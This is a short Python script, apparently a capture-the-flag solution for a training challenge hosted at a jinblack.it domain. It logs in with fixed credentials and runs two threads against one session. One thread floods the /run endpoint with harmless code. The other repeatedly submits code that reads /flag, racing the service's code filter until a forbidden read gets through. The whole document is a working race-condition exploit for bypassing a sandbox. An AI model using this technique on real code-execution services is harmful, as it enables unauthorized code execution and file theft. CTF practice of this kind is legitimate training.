import requests
from threading import Thread
code = "i=0\n" * 200
evilCode = "with open('/flag', 'r') as f:print(f.read())"


URL = 'http://pybook.training.jinblack.it'
URL_RUN = "%s/run" % (URL,)


def login(s):
    url = "%s/login" % (URL,)
    payload = {'username': 'batman', 'password': 'robin'}
    s.post(url, data=payload)

def notEvil(s):
    while True:
        r = s.post(URL_RUN, data=code)
        # If you don't put the print it will not wait until the post return a response so put it. Why so? Python suck!
        print(r.text)

def evil(s):
    while True:
        r = s.post(URL_RUN, data=evilCode)
        if 'Unallowd' not in r.text:
            print(r.text)


s = requests.Session()
login(s)

t_code = Thread(target=notEvil, args=[s])
t_evil = Thread(target=evil, args=[s])

t_code.start()
t_evil.start()